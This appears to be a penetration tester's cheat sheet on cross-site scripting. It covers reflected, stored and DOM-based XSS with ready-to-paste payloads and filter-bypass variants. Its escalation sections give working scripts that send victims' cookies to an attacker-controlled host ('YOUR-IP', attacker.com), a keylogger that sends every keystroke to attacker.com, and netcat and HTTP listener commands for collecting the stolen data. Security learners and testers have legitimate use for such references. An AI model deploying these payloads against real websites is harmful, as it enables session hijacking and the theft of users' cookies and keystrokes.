# CROSS-SITE SCRIPTING (XSS)

## Types

| Type | Description | Persistent |
|------|-------------|-----------|
| Reflected | Payload in URL/parameter → returned directly in the response | No |
| Stored | Payload saved in DB → executed for all users on every visit | Yes |
| DOM-based | DOM manipulation purely client-side, no server round-trip | No |

## Basic Test Payloads

```html
<script>prompt(1)</script>
<script>alert(1)</script>
<img src=x onerror="prompt(1)">
```

## Reflected XSS

Inject payload into URL parameter or search field:
```
http://target.com/search?q=<script>alert(1)</script>
```
→ Returned directly in the HTML response and executed in the browser.
→ Link must be sent to victim (phishing, email).

## Stored XSS

Save payload in a comment, profile, post, etc.:
```html
<h1>test</h1>
<script>prompt(1)</script>
```
→ Executes for every user on every page load — most dangerous.

## DOM-based XSS

Input lands directly in the DOM without server processing:
```html
<script>prompt(1)</script>
```
Common in JS functions like `innerHTML`, `document.write()`, `eval()`.

## Cookie Stealing

```javascript
<script>var i=new Image; i.src="http://YOUR-IP/?c="+document.cookie;</script>
```

Set up listener:
```bash
# Quick testing
https://webhook.site

# Own listener
$ nc -nvlp 80
$ python3 -m http.server 80
```

## Impact Escalation

```javascript
// Session hijacking via cookie redirect
<script>document.location='http://attacker.com/steal?c='+document.cookie;</script>

// Keylogger
<script>document.onkeypress=function(e){new Image().src="http://attacker.com/log?k="+e.key}</script>
```

## WAF Bypass Variants
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

## Burp Suite Workflow
1. Intercept request
2. Identify all input parameters
3. Send to **Repeater**
4. Insert `<script>alert(1)</script>` into parameter
5. Check response for reflected code (Ctrl+F: `<script>`)

## Resources
- https://webhook.site
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
